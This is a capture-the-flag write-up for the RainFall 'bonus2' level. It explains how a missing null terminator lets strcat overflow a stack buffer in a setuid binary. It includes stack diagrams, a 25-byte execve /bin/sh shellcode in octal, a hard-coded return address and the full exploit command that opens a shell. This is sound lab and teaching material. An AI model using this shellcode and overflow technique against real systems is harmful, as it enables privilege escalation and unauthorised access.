# RainFall (bonus2)

In this project, we try to **exploit binaries**.
By doing so, we wish to read the `/home/user/bonus3/.pass` file, containing our flag serving as the password for the next level.

## Binary decompilation.

It is a **ELF 32-bit x86 LSB** executable as stated by the `file -b ~/bonus2` command.

We use `objdump -d ~/bonus2` to disassemble the binary. We stored its truncated result in the [source.asm](./source.asm) file.

We also decompile the binary using a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra). We performed analysis and manual refactoring to isolate the vulnerability and make the relevant C code more readable. The result is saved in the [source.c](./source.c) file and generated through the [decompile.sh](./Ressources/decompile.sh) shell script.

## Binary particularities

By connecting via ssh (cf. [ssh.sh](./Ressources/ssh.sh)), we made some observations.

On login or by executing `checksec --kernel && checksec --file ~/bonus2`, we discover:
```sh
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
```

The binary is owned by `bonus3` and has the `setuid` flag set.
```sh
$ ls -la ~/bonus2
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 /home/user/bonus2/bonus2
```

Useful documentation:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASRL): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability & analysis

The decompiled binary (cf. [source](source.c)) is subject to an "Improper Null Termination" ([CWE-170](https://cwe.mitre.org/data/definitions/170.html)) that enables a "Stack-based Buffer Overflow" ([CWE-121](https://cwe.mitre.org/data/definitions/121.html)).

`main()` fills two contiguous buffers held by the `buf` structure: `buf.name` and `buf.other`.  
When enough characters are given, `strncpy()` does not ensure a null byte terminator (as can happen with `buf.name`).  
Read later as a string, `buf.name` is no longer bounded and spills into the next contiguous buffer, `buf.other`, until a null byte is found.  
In other words, when these conditions are met, `buf.name` can be read as a single 72-byte string instead of a 40-byte one.

In `greetuser()`, the `strcat()` call doesn't take this possibility into account. By choosing the correct `language` (set from the `LANG` env var), we can, through a buffer overflow, overwrite the function's return address and redirect execution to injected shellcode.

This is also possible because the kernel and binary enable no modern protections (NX disabled, no canary, ASLR off).

### Stack

`main()`'s stack frame should resemble something like this:
```ruby
      HIGHER MEMORY ADDRESSES     
| |      argv     | (4 bytes)    | <-- ['./bonus2', arg1, arg2];
| +---------------+              |
| |      argc     | (4 bytes)    |
+--------------------------------+
|      main's return address     | (4 bytes)
+--------------------------------+ <--- main's Stack Frame start (@ 0xbffffe2c)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- main's local variables start (EBP: @ 0xbffffe28)
| |   saved reg.  | (12 bytes)   |
| +---------------+              |
| |  unused/align | (12 bytes)   |
| +---------------+              |
| |    lang ptr   | (4 bytes)    |
| +-----+---------+              |
| |     |  other  | (36 bytes)   | (184 bytes)
| | buf +---------+   (76 bytes) |
| |     |  name   | (40 bytes)   |
| +-----+---------+ (0xbffffdc0) |
| |   alignment   | (4 bytes)    |
| +---------------+              |
| |    arg nº1    | (76 bytes)   |
+--------------------------------+ <--- main's Stack Pointer (ESP: @ 0xbffffd70)
      LOWER MEMORY ADDRESSES      
```

While `greetuser()`'s stack frame should resemble something like this:
```ruby
      HIGHER MEMORY ADDRESSES     
| | buf           | (76 bytes)   |
+--------------------------------+ <--- greetuser's arg start (@ 0xbffffd70, == main's ESP)
|   greetuser's return address   | (4 bytes)
+--------------------------------+ <--- greetuser's Stack Frame start (@ 0xbffffd6c)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- greetuser's local variables start (EBP: @ 0xbffffd68)
| |               |              |
| |   greeting    | (72 bytes)   |
| |               |              |
| |               |              |
| +---------------+ (0xbffffd20) |
| |  unused/align | (8 bytes)    | (88 bytes)
| +---------------+              |
| |    arg nº2    | (4 bytes)    |
| +---------------+              |
| |    arg nº1    | (4 bytes)    |
+--------------------------------+ <--- greetuser's Stack Pointer (ESP: @ 0xbffffd10)
      LOWER MEMORY ADDRESSES      
```

The addresses noted here are the ones observed under `env -i LANG=fi ./bonus2 <40 bytes> <22 bytes>`.
Process arguments being written before `main()`'s stackframe, they push it downwards.

### Intent

We wish to overflow the 72-byte `greeting` buffer in `greetuser()`, with the intent of overwriting its saved return address and redirecting execution to a shellcode injected on the stack. This is feasible because the binary ships without modern protections (NX disabled, no canary, ASLR off), so stack addresses are both executable and fixed across runs.

The `greeting` buffer is built the following way:
1. It selects one of 3 hard-coded strings based on a value passed via the `LANG` environment variable ***(7, 14 or 19 bytes)***.
2. It copies `main()`'s `buf` structure by value. When `buf.name` and `buf.other` are filled to the brim, due to a missing null byte terminator, reading `buf.name` results in a 72-byte string instead of a 40-byte one.
3. It concatenates both into the `greeting` buffer with `strcat()`, without verifying for any overflow risk.

The return address sits at `greeting+76`, so overwriting all 4 of its bytes means writing through offset 79 — 80 bytes from `greeting`'s start.

With the default `language`, the prefix is 6 bytes and `buf.name` contributes at most 72, so `strcat()` reaches only `6 + 72 = 78` bytes: two short. A longer prefix fixes this, which is what `LANG` controls.

## Exploit

### Template

First of all, we wish to stabilise the environment using `env -i`. This makes the stack's addresses less prone to shifting.
We then want to maximise the amount of bytes we can overflow `greeting`'s with. This can be done by:
- Passing the `LANG=fi` environment variable.
- Passing `40 bytes` as arg1.
- Passing `32 bytes` as arg2. `22 bytes` would be sufficient though for our objective.
```sh
$ env -i LANG='fi' ./bonus2 <40 bytes> <22 bytes>
```

### Shellcode

Given this input, we now wish to choose where the shellcode lives.  
`buf` exists twice, but `greetuser()`'s copy sits in the overflowed region and is destroyed by the `strcat()`. We therefore use `main()`'s, which stays intact. It is located at:
- In **big-endian hex**: `0xbffffdc0`  
- In **big-endian hex** escape sequence: `\xbf\xff\xfd\xc0`.  
- In **little-endian hex** escape sequence: `\xc0\xfd\xff\xbf`.  
- In **little-endian oct** escape sequence: `\300\375\377\277`.  

Let's also generate the shellcode. Though, building a shellcode byte sequence manually (as an **little-endian octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/exploit.asm";

# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";

# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";

# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";

# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
\061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
25
```

### Result

We can construct our solution based on the previous information
```sh
$ shellcode="$(generate_shellcode)";                                    # 25 bytes.
$ user_input_1="$(printf '%b%s' "$shellcode" 'AAAAAAAAAAAAAAA')";       # 25 + 15 = 40 bytes.
$ user_input_2="$(printf '%b' 'BBBBBBBBBBBBBBBBBB\300\375\377\277')";   # 18 + 4 = 22.
$ env -i LANG='fi' ./bonus2 "$user_input_1" "$user_input_2";
```

From there, we can open the  `/home/user/bonus3/.pass` file.
